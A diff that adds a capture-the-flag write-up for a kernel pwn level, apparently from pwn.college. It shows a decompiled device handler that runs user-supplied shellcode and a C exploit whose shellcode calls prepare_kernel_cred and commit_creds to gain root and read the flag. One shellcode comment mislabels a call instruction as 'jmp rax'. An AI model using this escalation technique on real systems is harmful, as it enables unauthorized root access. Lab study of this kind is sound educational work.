@@ -309,3 +309,61 @@ int main(int argc, char *argv[]) {
   return 0;
 }
 ```
+
+# Level 6.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Utilize a 'buggy' kernel device and shellcode to escalate privileges to root and get the flag!
+
+## Write-up
+
+读入 shellcode，然后执行。
+
+```c
+ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
+{
+  size_t n4096; // rdx
+  __int64 v6; // rbp
+
+  printk(&unk_698, file, buffer, length, offset);
+  n4096 = 4096;
+  if ( length <= 0x1000 )
+    n4096 = length;
+  v6 = copy_from_user(shellcode, buffer, n4096);
+  ((void (*)(void))shellcode)();
+  return length - v6;
+}
+```
+
+注意 `call` 指令需要指定返回到哪里，否则会跑飞。
+
+## Exploit
+
+```c
+#include <fcntl.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]) {
+  int fd = open("/proc/pwncollege", O_WRONLY);
+
+  unsigned char sc[] =
+      "\x48\x31\xff"                 // xor rdi, rdi
+      "\x48\xc7\xc0\x60\x96\x08\x81" // mov rax, 0xffffffff81089660
+      "\xff\xd0"                     // call rax (prepare_kernel_cred)
+      "\x48\x89\xc7"                 // mov rdi, rax
+      "\x48\xc7\xc0\x10\x93\x08\x81" // mov rax, 0xffffffff81089310
+      "\xff\xd0"                     // jmp rax (commit_creds)
+      "\xc3";                        // ret
+
+  write(fd, sc, sizeof(sc));
+  system("cat /flag");
+
+  return 0;
+}
+```
